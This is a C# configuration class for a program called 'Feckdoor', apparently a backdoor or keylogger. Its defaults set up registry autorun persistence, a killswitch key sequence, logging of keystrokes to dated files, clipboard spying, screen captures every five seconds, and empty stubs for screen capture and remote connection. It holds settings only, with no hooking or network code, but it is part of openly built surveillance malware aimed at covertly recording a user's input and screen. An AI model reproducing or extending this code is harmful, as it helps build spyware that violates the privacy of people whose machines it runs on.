namespace Feckdoor
{
	public class Config
	{
		// Global entry
		public static Config TheConfig
		{
			get; set;
		} = null!;

		public string ProgramLogFile
		{
			get; set;
		} = @".\{0:yyyyMMdd}.log";

		public string LogTemplate
		{
			get; set;
		} = "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] {Message:lj}{NewLine}{Exception}";

		public int LogRollingSize
		{
			get; set;
		} = 8388608;

		public int LogFlushInterval
		{
			get; set;
		} = 1000;

		public string RegistryAutorunName
		{
			get; set;
		} = "Feckdoor";

		public string Killswitch
		{
			get; set;
		} = "70 71 72 73 78 79 7A 7B";

		public int KillswitchTimer
		{
			get; set;
		} = 200;

		public InputLogSection InputLog
		{
			get; set;
		} = new InputLogSection();

		public ScreenCaptureSection ScreenCapture
		{
			get; set;
		} = new ScreenCaptureSection();
	}

	public class InputLogSection
	{
		public LogMode LogMode
		{
			get; set;
		} = LogMode.PlainText;

		public string InputLogFile
		{
			get; set;
		} = @".\InputLog.{0:yyyyMMdd}.{1}.log";

		public int RollingSize
		{
			get; set;
		} = 8388608;

		public bool ShiftPrefix
		{
			get; set;
		}

		public bool SuppressModifierKey
		{
			get; set;
		}

		public bool AutoCapitalize
		{
			get; set;
		} = true;

		public int ClipboardSpyDelay
		{
			get; set;
		} = 200;

		public string FallbackWindowName
		{
			get; set;
		} = "Unknown window";

		public string FallbackWindowExecutableName
		{
			get; set;
		} = "Unknown executable";

		public int SaveWait
		{
			get; set;
		} = 2000;

		public int SaveMaxUndone
		{
			get; set;
		} = 20;

		public int SaveDelay
		{
			get; set;
		} = 100;

		public PlainTextSection PlainText
		{
			get; set;
		} = new PlainTextSection();
	}

	public class ScreenCaptureSection
	{
		public string FileNameFormat
		{
			get; set;
		} = ".\\{0:yyyy-MM-dd hh-mm-ss.ffff}.{1}.png";

		public string ImageFormat
		{
			get; set;
		} = "Png";

		public int CapturePeriod
		{
			get; set;
		} = 5000;

		public int RetainedCaptureCount
		{
			get; set;
		} = 100;
	}

	public class PlainTextSection
	{
		public string TimestampFormat
		{
			get; set;
		} = "dd MMM yyyy hh:mm:ss.ffff tt";

		public int TimestampDelay
		{
			get; set;
		} = 5000;
	}

	// TODOs

	public class ScreenCapture
	{

	}

	public class RemoteConnect
	{

	}


	public enum LogMode
	{
		PlainText,
		SQLite
	}
}
